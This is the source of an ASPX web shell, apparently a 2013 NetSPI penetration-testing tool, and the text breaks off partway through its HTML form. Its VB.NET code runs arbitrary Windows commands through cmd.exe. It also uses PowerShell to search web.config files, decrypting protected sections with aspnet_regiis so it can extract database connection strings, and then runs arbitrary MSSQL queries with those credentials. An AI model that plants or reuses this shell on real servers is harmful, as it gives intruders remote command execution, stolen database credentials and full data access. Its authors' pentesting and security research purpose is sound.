<!-- Web shell - command execution, web.config parsing, and SQL query execution -->

<!-- Command execution - Run arbitrary Windows commands -->
<!-- Web.Config Parser - Extract db connection strings from web.configs (based on chosen root dir) -->
<!-- SQL Query Execution - Execute arbitrary SQL queries (MSSQL only) based on extracted connection strings -->

<!-- Antti - NetSPI - 2013 -->
<!-- Thanks to Scott (nullbind) for help and fancy stylesheets -->
<!-- Based on old cmd.aspx from fuzzdb - http://code.google.com/p/fuzzdb/ -->

<%@ Page Language="VB" Debug="true" %>
<%@ import Namespace="system.IO" %>
<%@ import Namespace="System.Diagnostics" %>

<script runat="server">      
Protected Sub RunCmd(sender As Object, e As System.Web.UI.WebControls.CommandEventArgs)
  Dim myProcess As New Process()            
  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            
  Dim titletext As String
  myProcessStartInfo.UseShellExecute = false            
  myProcessStartInfo.RedirectStandardOutput = true            
  myProcess.StartInfo = myProcessStartInfo
  
  if (e.CommandArgument="cmd") then
    myProcessStartInfo.Arguments=xcmd.text 
    titletext = "Command Execution"	
  else if (e.CommandArgument="webconf") then
    myProcessStartInfo.Arguments=" /c powershell -C ""$ErrorActionPreference = 'SilentlyContinue';" 
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "$path='" + webpath.text + "'; write-host ""Searching for web.configs in $path ...`n"";"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "Foreach ($file in (get-childitem $path -Filter web.config -Recurse)) { Try { $xml = [xml](get-content $file.FullName); } Catch { continue; } "
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "Try { $connstrings = $xml.get_DocumentElement(); } Catch { continue; } "
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "if ($connstrings.ConnectionStrings.encrypteddata.cipherdata.ciphervalue -ne $null) "
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "{ $tempdir = (Get-Date).Ticks; new-item $env:temp\$tempdir -ItemType directory | out-null; copy-item $file.FullName $env:temp\$tempdir;"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "$aspnet_regiis = (get-childitem $env:windir\microsoft.net\ -Filter aspnet_regiis.exe -recurse | select-object -last 1).FullName + ' -pdf ""connectionStrings"" ' + $env:temp + '\' + $tempdir;"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "Invoke-Expression $aspnet_regiis; Try { $xml = [xml](get-content $env:temp\$tempdir\$file); } Catch { continue; }"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "Try { $connstrings = $xml.get_DocumentElement(); } Catch { continue; }"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "remove-item $env:temp\$tempdir -recurse;} "
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "Foreach ($_ in $connstrings.ConnectionStrings.add) { if ($_.connectionString -ne $NULL) { write-host ""$file.Fullname --- $_.connectionString""} } }"""
	titletext = "Connection String Parser"	
  else if (e.CommandArgument="sqlquery") then
    myProcessStartInfo.Arguments=" /c powershell -C ""$conn=new-object System.Data.SqlClient.SQLConnection(""""""" + conn.text + """"""");"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "Try { $conn.Open(); }"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "Catch { continue; }"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "$cmd = new-object System.Data.SqlClient.SqlCommand("""""""+query.text+""""""",$conn);"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "$ds=New-Object system.Data.DataSet;"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "$da=New-Object system.Data.SqlClient.SqlDataAdapter($cmd);"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "[void]$da.fill($ds);"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "$ds.Tables[0];"
    myProcessStartInfo.Arguments=myProcessStartInfo.Arguments + "$conn.Close();"""
	titletext = "SQL Query Result"	
  end if  
  myProcess.Start()            
  Dim myStreamReader As StreamReader = myProcess.StandardOutput            
  Dim myString As String = myStreamReader.Readtoend()            
  myProcess.Close()            
  mystring=replace(mystring,"<","&lt;")            
  mystring=replace(mystring,">","&gt;")
  history.text = result.text + history.text
  result.text= vbcrlf & "<p><h2>" & titletext & "</h2><pre>" & mystring & "</pre>" 
End Sub
</script>

<html>
<head>
<style>
<style>
 body {
  background-image: url("images/repeat.jpg");
  background-repeat: repeat;
 }
 
.para1 {
	margin-left:30px;
	vertical-align:top;
}
.para2 {
	margin-left:30px;	
}
.para3 {
	margin-left:20px;
	margin-top:30px;
	vertical-align:top;
	background-image:url('images/post_middle.jpg');
}
.norep {
	background-image:url('images/repeat2.jpg');
	background-repeat:y-repeat;
	
}
.menu{
margin-right:56px;
margin-bottom:40px;
vertical-align: top;
font-weight: bold;
font-family: Verdana, Arial, Helvetica, sans-serif;
font-size: 12px;
}
.tbl_main_bdr {
	border: medium solid #333333;
}
.tbl_inside_bdr {
	border: thin solid #666666;
}
.style3 {
	margin-left: 20px;
	vertical-align: top;
	font-weight: bold;
	font-family: Verdana, Arial, Helvetica, sans-serif;
	font-size: 18px;
}
.post{
background-repeat:no-repeat;
background-image:url('images/post_top.jpg');
}
.style12 {color: #00CC00}
a:link{
text-decoration:none;
COLOR: #000000;
}
a:hover{
text-decoration:underline;
}
.htext{
margin-right:20px;
}
.style17 {font-size: 9px}
.style20 {font-family: Arial, Helvetica, sans-serif}
.style21 {font-size: 24px}
.style22 {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 24px;
	font-weight: bold;
}
</style>
</head>
<body>   

<form runat="server"> 
	<table border="0" cellspacing="4" cellpadding="4" width="750">
		<tr>
		 <td>
		 <img alt="" src="data:image/png;base64,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" />
		 </td>
		 <td valign="bottom" align="right">
		 <strong><span class="style21"><span class="style20"><font color="003366">Database Connection Web Shell</font></span></span></strong></a>
		 </td>
		</tr>
	</table>	
	<table border="0" cellspacing="4" cellpadding="4">
		<tr>
			<td valign="middle" width ="100" bgcolor="#990000" align="center">
				<strong><span class="style21"><span class="style20">STEP 1</span></span></strong></a><Br>
			</td>	
			<td valign="middle" width ="150"  bgcolor="#A0A0A0" align="center">
				<strong>ENTER OS COMMANDS</strong></a><Br>
			</td>			
            <td valign="top" width="350" bgcolor="#CCCCCC" align="left">				
				<asp:Label id="L_p" runat="server">Application:</asp:Label><br>
				<asp:TextBox id="xpath" width="350" runat="server">c:\windows\system32\cmd.exe</asp:TextBox><br><br>
				<asp:Label id="L_a" runat="server">Arguments:</asp:Label><br>        
				<asp:TextBox id="xcmd" width="350" runat="server" Text="/c net user">/c net user</asp:TextBox><br>
			</td>  
			<td valign="middle"  bgcolor="#CCCCCC" align="center" onMouseOver="style.backgroundColor='#CCFF99';" onMouseOut="style.backgroundColor='#CCCCCC'">
				<strong><span class="style21"><span class="style20">RUN</span></span></strong><Br>
				<asp:Button id="Button" OnCommand="RunCmd" CommandArgument="cmd" runat="server" Width="100px" Text="RUN"></asp:Button>
			</td>
        </tr>                     
		<tr>
			<td valign="middle" width ="100" bgcolor="#6699CC" align="center">
				<strong><span class="style21"><span class="style20">STEP 2</span></span></strong></a><Br>
			</td>	
			<td valign="middle" width ="150" bgcolor="#A0A0A0" align="center">
				<strong>PARSE WEB.CONFIGS FOR CONNECTION STRINGS</strong></a><Br>
			</td>			
            <td valign="top" width="350" bgcolor="#CCCCCC" align="left">
				Path to web directories:<br>
				<asp:TextBox id="webpath" width="350" runat="server" Text="c:\inetpub">C:\inetpub</asp:TextBox>		
			</td>  
			<td valign="middle" bgcolor="#CCCCCC" align="center" onMouseOver="style.backgroundColor='#CCFF99';" onMouseOut="style.backgroundColor='#CCCCCC'">
				<strong><span class="style21"><span class="style20">RUN</span></span></strong><Br>
